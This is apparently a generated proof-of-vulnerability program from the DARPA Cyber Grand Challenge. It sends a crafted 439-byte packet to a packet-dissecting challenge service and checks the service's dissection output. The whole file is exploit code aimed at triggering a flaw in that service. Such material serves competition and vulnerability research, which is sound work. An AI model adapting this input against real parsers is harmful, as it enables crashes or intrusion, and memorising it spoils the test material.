#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb7\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x00\x00\x97\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x97\x01\x00\x00"
         "\xae\x25\x49\x47\x0e\x1e\xfc\x43\xc3\x5e\x82\xf9\x21\x97\x94\xd3"
         "\xd8\xbb\xcb\x63\x28\x00\x00\x00\x41\x00\x01\x1b\x16\x60\x01\x15"
         "\x01\x00\x1e\xaa\x75\x41\x00\xf5\xf8\x73\xff\x76\xbf\x22\xc3\x41"
         "\x00\x15\x50\x87\x9b\xa5\x31\xbf\xdc\x1e\x23\xcc\x1b\x92\x8b\xf8"
         "\x13\x92\x9d\x01\x40\x57\x3b\x45\x41\x00\x09\x77\x8d\x21\x01\x84"
         "\xb3\x15\x5e\x8f\xab\x12\xb7\x41\x00\xf1\x1f\x0f\x7c\x89\xb4\x4b"
         "\xf4\x4f\x0b\xa1\xe0\xa7\x72\x66\x93\x1c\x04\x7e\x05\xdd\x9d\x67"
         "\xb0\xed\x27\x11\x96\x03\x55\x4b\x18\xe6\x55\x01\x00\xcd\x01\x00"
         "\x37\xe8\xf0\x15\xce\xff\x71\x45\x29\x2a\x5d\xed\x87\x05\xe5\xb1"
         "\x30\xe2\x6d\x28\xba\xf8\x3c\xf3\x48\x7c\x75\xbe\x11\xb4\xa4\x61"
         "\x9f\xa5\xe1\x50\x56\x07\x3a\x91\x95\x61\x88\x4f\x88\x98\xf2\xd1"
         "\xa3\xce\x6e\xbc\xee\x9c\xd4\x32\x55\x29\xfe\x41\x9d\xa8\x0b\xe3"
         "\xbd\x4b\x71\xb1\xeb\x8a\xaa\x59\x5d\x09\x4d\x41\xee\x04\x97\x3c"
         "\x24\x8d\x72\xe8\xc4\xa4\xfa\x49\x41\x17\x0a\x7a\xcf\x27\x7b\xa0"
         "\x09\xd7\x7d\x71\x8f\x9a\x02\x85\x9e\x0d\x50\xd6\x4f\x89\xcb\xf3"
         "\x41\x57\x28\xa2\x32\xd8\x06\xa4\x24\x36\x84\x44\xee\x02\x35\xf9"
         "\x8c\xbf\xcf\x53\x87\xbf\x84\x28\x5c\x7b\x27\xf1\x13\x72\x14\xda"
         "\xe8\xca\xee\x67\x84\xfe\xa8\xc3\x5b\x63\x8a\x7f\x3e\xaa\x7c\xc5"
         "\x2e\xf6\x69\x95\x6d\x74\x8e\x9f\x70\x8f\xd8\x50\x23\xd5\xfb\x7f"
         "\x6c\xf2\xe8\xa3\xdd\xcf\x73\x5d\x8a\x4e\xbf\x02\x10\x21\xac\xb4"
         "\xf5\x1a\xb8\x63\x65\x50\xf6\xd5\xa9\x18\x7d\x05\x5e\xa8\x98\xc5"
         "\xe0\x0f\x2b\x8d\x0f\x90\xe1\x11\x05\x06\xd3\xab\x98\x55\x7e\x28"
         "\xbc\xe7\xb9\x85\xe6\x7a\x07\x12\xaf\x6a\xec\x1a\x0d\x90\xdc\x3b"
         "\x85\x12\x74\xe2\x6b\x98\xe1\x18\x78\xf7\xce\x2a\x2c\x57\x21\xc9"
         "\x29\xb3\x1d\x7f\xa7\x41\x00\x01\x00\x59\xf4\x4f\x22\x01\xde\x70"
         "\x85\x9a\x88\xe3\xea\x7a\x81";
      static unsigned int write_00001_00000_len = 439;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamadigredience
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x64\x69\x67\x72\x65\x64"
         "\x69\x65\x6e\x63\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
